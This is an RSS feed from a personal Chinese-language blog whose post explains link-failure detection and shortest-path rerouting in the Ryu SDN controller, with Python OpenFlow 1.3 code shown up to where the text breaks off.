<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>坤少</title>
    <link>http://prayallforyou.top/</link>
    <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>个人博客</description>
    <pubDate>Sun, 01 Apr 2018 13:39:29 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>Ryu实现链路故障路由</title>
      <link>http://prayallforyou.top/2018/04/01/ryuRouting/</link>
      <guid>http://prayallforyou.top/2018/04/01/ryuRouting/</guid>
      <pubDate>Sun, 01 Apr 2018 00:58:34 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;大家愚人节快乐，突然发现最近人变懒了，上次写博客还是春节前（尴尬脸）。临近毕业，有点猖狂，天天看球、打游戏混日子，再此检讨。毕业了，把自己研究生期间的研究成果分享一下吧，虽然也没什么成果，哈哈。话不多说，切入正题。&lt;/p&gt;
&lt;h2 id=&quot;Ryu开源控制器&quot;&gt;&lt;a href
        
      
      </description>
      
      <content:encoded><![CDATA[<p>大家愚人节快乐，突然发现最近人变懒了，上次写博客还是春节前（尴尬脸）。临近毕业，有点猖狂，天天看球、打游戏混日子，再此检讨。毕业了，把自己研究生期间的研究成果分享一下吧，虽然也没什么成果，哈哈。话不多说，切入正题。</p><h2 id="Ryu开源控制器"><a href="#Ryu开源控制器" class="headerlink" title="Ryu开源控制器"></a>Ryu开源控制器</h2><p>Ryu 控制器是由日本 NTT 公司开发的一款开源控制器，遵循了标准的 SDN 设计模 式，完全由 Python 实现。Ryu 为开发者提供了控制器的编程框架，开发者可以根据实际 需要，往其中添加定制的模块。Ryu 内部实现了对 OpenFlow 以及其他 SDN 网络协议的 支持。由于其源码公开、易搭建的特点，受到了研究学者的青睐。 </p><p>Ryu的框架如图中所示。<img src="/iamges/RYU.jpg" alt="">Ryu 采用了事件触发的机制来响应网络事件，当网 络数据包到达或是出现网路异常的情况下，就会触发提前注册的事件响应机制，采取相 应的措施。Ryu 内置了基本的网络应用，包括网络拓扑的发现、网络防火墙的设置等。 同时还允许开发者基于特定的网络需求，设计定制的 Ryu 应用。整个 Ryu 对上层用户 的应用提供北向接口协议（REST）的支持，对下层的交换机提供南向接口协议（OpenFlow） 的支持。</p><h2 id="链路故障发现"><a href="#链路故障发现" class="headerlink" title="链路故障发现"></a>链路故障发现</h2><p>Ryu使用链路层发现协议（LLDP）实现对网络链路的监控，链路发现的原理非常容易理解。控制器向一个交换机A发送LLDP报文，交换机A的一个端口接受到控制器发来的LLDP报文后，向其他端口转发该报文，如果交换机B同交换机A相连，那么交换机B就会收到从交换机A发来的LLDP报文，并通过packet_in消息上传给控制器，控制器通过对packet_in消息携带的设备和端口信息就可以确定交换机A、B之间的链路。同样的道理，如果交换机A、B之间的链路收到某种威胁使得链路不可达，控制器发现A的LLDP报文就不会到达B，通过周期性的检测即可获知链路故障。</p><h2 id="链路故障路由实现"><a href="#链路故障路由实现" class="headerlink" title="链路故障路由实现"></a>链路故障路由实现</h2><p>当检测到链路故障的时候，我们可以通过对流经该链路的网络流重新计算转发路径的方式恢复网络连通性，保证网络流可以正常的到达目的IP。在代码演示部分采用最短路径的方式实现最短路由，起点为源IP，终点为目的IP。</p><h2 id="代码演示"><a href="#代码演示" class="headerlink" title="代码演示"></a>代码演示</h2><p>基于OpenFlow1.3实现了链路故障检测后的修复功能，具体代码如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br></pre></td><td class="code"><pre><span class="line"># conding=utf-8</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Data:2018.4.1</span><br><span class="line">Author:坤少</span><br><span class="line">Descrption: A simple arp proctol implementation and hop based shortest path  discovery and forwarding implementation based on OpenFlow13. </span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import logging</span><br><span class="line">import struct</span><br><span class="line">import copy</span><br><span class="line">import networkx as nx</span><br><span class="line">from operator import attrgetter</span><br><span class="line">from ryu import cfg</span><br><span class="line">from ryu.base import app_manager</span><br><span class="line">from ryu.controller import ofp_event</span><br><span class="line">from ryu.controller.handler import MAIN_DISPATCHER, DEAD_DISPATCHER</span><br><span class="line">from ryu.controller.handler import CONFIG_DISPATCHER</span><br><span class="line">from ryu.controller.handler import set_ev_cls</span><br><span class="line">from ryu.ofproto import ofproto_v1_3</span><br><span class="line">from ryu.ofproto import ether</span><br><span class="line">from ryu.lib.packet import packet</span><br><span class="line">from ryu.lib.packet import ethernet</span><br><span class="line">from ryu.lib.packet import ipv4</span><br><span class="line">from ryu.lib.packet import ipv6</span><br><span class="line">from ryu.lib.packet import arp</span><br><span class="line">from ryu.lib.packet import ether_types</span><br><span class="line">from ryu.lib import hub</span><br><span class="line"></span><br><span class="line">from ryu.topology import event, switches</span><br><span class="line">from ryu.topology.api import get_switch, get_link</span><br><span class="line">import setting</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CONF = cfg.CONF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class NetworkAwareness(app_manager.RyuApp):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">        NetworkAwareness is a Ryu app for discover topology information.</span><br><span class="line">        This App can provide many data services for other App, such as</span><br><span class="line">        link_to_port, access_table, switch_port_table,access_ports,</span><br><span class="line">        interior_ports,topology graph and shorteest paths.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    OFP_VERSIONS = [ofproto_v1_3.OFP_VERSION]</span><br><span class="line"></span><br><span class="line">    def __init__(self, *args, **kwargs):</span><br><span class="line">        super(NetworkAwareness, self).__init__(*args, **kwargs)</span><br><span class="line">        self.topology_api_app = self</span><br><span class="line">        self.name = &quot;awareness&quot;</span><br><span class="line">        self.mac_to_port = &#123;&#125;        # dpid:&#123;mac:port&#125;</span><br><span class="line">        self.link_to_port = &#123;&#125;       # (src_dpid,dst_dpid)-&gt;(src_port,dst_port)</span><br><span class="line">        self.access_table = &#123;&#125;       # &#123;(sw,port) :[host1_ip]&#125;</span><br><span class="line">        self.switch_port_table = &#123;&#125;  # dpip-&gt;port_num</span><br><span class="line">        self.access_ports = &#123;&#125;       # dpid-&gt;port_num</span><br><span class="line">        self.interior_ports = &#123;&#125;     # dpid-&gt;port_num</span><br><span class="line">        self.switches = [] # all switches connected to the controller</span><br><span class="line">        self.datapaths =&#123;&#125;</span><br><span class="line"></span><br><span class="line">        self.graph = nx.DiGraph()</span><br><span class="line">        self.pre_graph = nx.DiGraph()</span><br><span class="line">        self.pre_access_table = &#123;&#125;</span><br><span class="line">        self.pre_link_to_port = &#123;&#125;</span><br><span class="line">        self.shortest_paths = None</span><br><span class="line"></span><br><span class="line">        # Start a green thread to discover network resource.</span><br><span class="line">        self.discover_thread = hub.spawn(self._discover)</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def change2hex(ether_type):</span><br><span class="line">        return hex(ether_type)</span><br><span class="line"></span><br><span class="line">    def _discover(self):</span><br><span class="line">        i = 0</span><br><span class="line">        while True:</span><br><span class="line">            print round(time.time()*1000)</span><br><span class="line">            self.show_topology()</span><br><span class="line">            if i == 5:</span><br><span class="line">                self.get_topology(None)</span><br><span class="line">                i = 0</span><br><span class="line">            hub.sleep(setting.DISCOVERY_PERIOD)</span><br><span class="line">            i = i + 1</span><br><span class="line"></span><br><span class="line">    @set_ev_cls(ofp_event.EventOFPStateChange,[MAIN_DISPATCHER,DEAD_DISPATCHER])</span><br><span class="line">    def _state_change_handler(self,ev):</span><br><span class="line">        datapath = ev.datapath</span><br><span class="line">        if ev.state == MAIN_DISPATCHER:</span><br><span class="line">            if not datapath.id in self.datapaths:</span><br><span class="line">                self.logger.info(&quot;register datapath : %16x&quot;,datapath.id)</span><br><span class="line">                self.datapaths[datapath.id]=datapath</span><br><span class="line">        elif ev.state == DEAD_DISPATCHER:</span><br><span class="line">            if datapath.id in self.datapaths:</span><br><span class="line">                self.logger.info(&quot;unregister datapath : %16x&quot;,datapath.id)</span><br><span class="line">                del self.datapaths[datapath.id]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @set_ev_cls(ofp_event.EventOFPSwitchFeatures, CONFIG_DISPATCHER)</span><br><span class="line">    def switch_features_handler(self, ev):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">            Initial operation, send miss-table flow entry to datapaths.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        datapath = ev.msg.datapath</span><br><span class="line">        ofproto = datapath.ofproto</span><br><span class="line">        parser = datapath.ofproto_parser</span><br><span class="line">        msg = ev.msg</span><br><span class="line">        self.logger.info(&quot;switch:%s connected&quot;, datapath.id)</span><br><span class="line"></span><br><span class="line">        # install table-miss flow entry</span><br><span class="line">        match = parser.OFPMatch()</span><br><span class="line">        actions = [parser.OFPActionOutput(ofproto.OFPP_CONTROLLER,</span><br><span class="line">                                          ofproto.OFPCML_NO_BUFFER)]</span><br><span class="line">        self.add_flow(datapath, 0, match, actions)</span><br><span class="line"></span><br><span class="line">    def add_flow(self, dp, p, match, actions, idle_timeout=0, hard_timeout=0):</span><br><span class="line">        ofproto = dp.ofproto</span><br><span class="line">        parser = dp.ofproto_parser</span><br><span class="line"></span><br><span class="line">        inst = [parser.OFPInstructionActions(ofproto.OFPIT_APPLY_ACTIONS,</span><br><span class="line">                                             actions)]</span><br><span class="line"></span><br><span class="line">        mod = parser.OFPFlowMod(datapath=dp, priority=p,</span><br><span class="line">                                idle_timeout=idle_timeout,</span><br><span class="line">                                hard_timeout=hard_timeout,</span><br><span class="line">                                match=match, instructions=inst)</span><br><span class="line">        dp.send_msg(mod)</span><br><span class="line"></span><br><span class="line">    def send_flow_mod(self, datapath, flow_info, src_port, dst_port):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">            Build flow entry, and send it to datapath.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        parser = datapath.ofproto_parser</span><br><span class="line">        actions = []</span><br><span class="line">        actions.append(parser.OFPActionOutput(dst_port))</span><br><span class="line"></span><br><span class="line">        match = parser.OFPMatch(</span><br><span class="line">            in_port=src_port, eth_type=flow_info[0],</span><br><span class="line">            ipv4_src=flow_info[1], ipv4_dst=flow_info[2])</span><br><span class="line"></span><br><span class="line">        self.add_flow(datapath, 1, match, actions,</span><br><span class="line">                      idle_timeout=15, hard_timeout=60)</span><br><span class="line"></span><br><span class="line">    def get_host_location(self, host_ip):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">            Get host location info:(datapath, port) according to host ip.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        for key in self.access_table.keys():</span><br><span class="line">            if self.access_table[key][0] == host_ip:</span><br><span class="line">                return key</span><br><span class="line">        self.logger.debug(&quot;%s location is not found.&quot; % host_ip)</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    def get_sw(self, dpid, in_port, src, dst):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">            Get pair of source and destination switches.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        src_sw = dpid</span><br><span class="line">        dst_sw = None</span><br><span class="line"></span><br><span class="line">        src_location = self.get_host_location(src)</span><br><span class="line">        if in_port in self.access_ports[dpid]:</span><br><span class="line">            if (dpid,  in_port) == src_location:</span><br><span class="line">                src_sw = src_location[0]</span><br><span class="line">            else:</span><br><span class="line">                return None</span><br><span class="line"></span><br><span class="line">        dst_location = self.get_host_location(dst)</span><br><span class="line">        if dst_location:</span><br><span class="line">            dst_sw = dst_location[0]</span><br><span class="line"></span><br><span class="line">        return src_sw, dst_sw</span><br><span class="line"></span><br><span class="line">    def get_path(self, src, dst):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">            Get shortest path from network awareness module.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        shortest_paths = self.shortest_paths</span><br><span class="line">        graph = self.graph</span><br><span class="line">        return shortest_paths.get(src).get(dst)[0]</span><br><span class="line"></span><br><span class="line">    def get_switches(self):</span><br><span class="line">        return self.switches</span><br><span class="line"></span><br><span class="line">    def get_links(self):</span><br><span class="line">        return self.link_to_port</span><br><span class="line"></span><br><span class="line">    def get_graph(self, link_list):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">            Get Adjacency matrix from link_to_port</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        for src in self.switches:</span><br><span class="line">            for dst in self.switches:</span><br><span class="line">                if src == dst:</span><br><span class="line">                    self.graph.add_edge(src, dst, weight=0)</span><br><span class="line">                elif (src, dst) in link_list:</span><br><span class="line">                    self.graph.add_edge(src, dst, weight=1)</span><br><span class="line">        return self.graph</span><br><span class="line"></span><br><span class="line">    def get_port_pair_from_link(self, link_to_port, src_dpid, dst_dpid):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">            Get port pair of link, so that controller can install flow entry.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        if (src_dpid, dst_dpid) in link_to_port:</span><br><span class="line">            return link_to_port[(src_dpid, dst_dpid)]</span><br><span class="line">        else:</span><br><span class="line">            self.logger.info(&quot;dpid:%s-&gt;dpid:%s is not in links&quot; % (</span><br><span class="line">                             src_dpid, dst_dpid))</span><br><span class="line">            return None</span><br><span class="line"></span><br><span class="line">    def get_port(self, dst_ip, access_table):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">            Get access port if dst host.</span><br><span class="line">            access_table: &#123;(sw,port) :(ip, mac)&#125;</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        if access_table:</span><br><span class="line">            if isinstance(access_table.values()[0], tuple):</span><br><span class="line">                for key in access_table.keys():</span><br><span class="line">                    if dst_ip == access_table[key][0]:</span><br><span class="line">                        dst_port = key[1]</span><br><span class="line">                        return dst_port</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    def shortest_forwarding(self,msg,eth_type,ip_src,ip_dst):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">            To calculate shortest forwarding path and install them into datapaths.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        datapath = msg.datapath</span><br><span class="line">        ofproto = datapath.ofproto</span><br><span class="line">        parser = datapath.ofproto_parser</span><br><span class="line">        in_port = msg.match[&apos;in_port&apos;]</span><br><span class="line"></span><br><span class="line">        result = self.get_sw(datapath.id, in_port, ip_src, ip_dst)</span><br><span class="line">        if result:</span><br><span class="line">            src_sw, dst_sw = result[0], result[1]</span><br><span class="line">            if dst_sw:</span><br><span class="line">                # Path has already calculated, just get it.</span><br><span class="line">                path = self.get_path(src_sw, dst_sw)</span><br><span class="line">                self.logger.info(&quot;[PATH]%s&lt;--&gt;%s: %s&quot; % (ip_src, ip_dst, path))</span><br><span class="line">                flow_info = (eth_type, ip_src, ip_dst, in_port)</span><br><span class="line">                # install flow entries to datapath along side the path.</span><br><span class="line">                self.install_flow(self.datapaths,</span><br><span class="line">                                  self.link_to_port,</span><br><span class="line">                                  self.access_table, path,</span><br><span class="line">                                  flow_info, msg.buffer_id, msg.data)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def install_flow(self, datapaths, link_to_port, access_table, path,</span><br><span class="line">                     flow_info, buffer_id, data=None):</span><br><span class="line">        &apos;&apos;&apos;</span><br><span class="line">            Install flow entires for roundtrip: go and back.</span><br><span class="line">            @parameter: path=[dpid1, dpid2...]</span><br><span class="line">                        flow_info=(eth_type, src_ip, dst_ip, in_port)</span><br><span class="line">        &apos;&apos;&apos;</span><br><span class="line">        if path is None or len(path) == 0:</span><br><span class="line">            self.logger.info(&quot;Path error!&quot;)</span><br><span class="line">            return</span><br><span class="line">        in_port = flow_info[3]</span><br><span class="line">        first_dp = datapaths[path[0]]</span><br><span class="line">        out_port = first_dp.ofproto.OFPP_LOCAL</span><br><span class="line">        back_info = (flow_info[0], flow_info[2], flow_info[1])</span><br><span class="line"></span><br><span class="line">        # inter_link</span><br><span class="line">        if len(path) &gt; 2:</span><br><span class="line">            for i in xrange(1, len(path)-1):</span><br><span class="line">                port = self.get_port_pair_from_link(link_to_port,</span><br><span class="line">                                                    path[i-1], path[i])</span><br><span class="line">                port_next = self.get_port_pair_from_link(link_to_port,</span><br><span class="line">                                                         path[i], path[i+1])</span><br><span class="line">                if port and port_next:</span><br><span class="line">                    src_port, dst_port = port[1], port_next[0]</span><br><span class="line">                    